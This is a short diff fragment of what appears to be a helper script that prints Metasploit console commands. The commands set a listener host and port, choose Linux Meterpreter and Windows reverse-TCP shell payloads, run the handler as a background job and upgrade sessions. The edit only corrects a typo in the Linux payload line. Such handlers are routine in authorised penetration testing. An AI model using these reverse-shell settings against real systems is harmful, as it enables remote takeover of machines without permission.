@@ -48,7 +48,7 @@ echo "
      |	set LHOST $lhost
      |	set LPORT $lport
      |	set ExitOnSession false
-     |  lin: set PAYLOAD set payload linux/x86/meterpreter/reverse_tcp
+     |  lin: set payload linux/x86/meterpreter/reverse_tcp
      |  win: set payload windows/shell/reverse_tcp
      |  exploit -j -z
      |  sessions -u 1 
